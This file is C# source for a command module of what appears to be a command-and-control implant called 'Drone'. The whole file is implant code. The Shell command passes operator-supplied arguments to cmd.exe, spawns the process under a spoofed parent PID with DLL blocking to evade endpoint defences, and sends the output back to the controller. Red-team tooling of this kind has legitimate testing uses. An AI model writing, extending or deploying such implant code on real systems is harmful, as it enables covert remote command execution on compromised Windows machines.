using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Commands;

public sealed class Shell : DroneCommand
{
    public override byte Command => 0x0D;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var ppid = Drone.Config.Get<int>(Setting.ParentPid);
        var blockDlls = Drone.Config.Get<bool>(Setting.BlockDlls);
        
        var spawner = new ProcessSpawner(ppid, blockDlls);

        var command = $"C:\\Windows\\System32\\cmd.exe /c {string.Join(" ", task.Arguments)}";
        var output = spawner.SpawnAndReadProcess(command);

        await Drone.SendOutput(task, output);
    }
}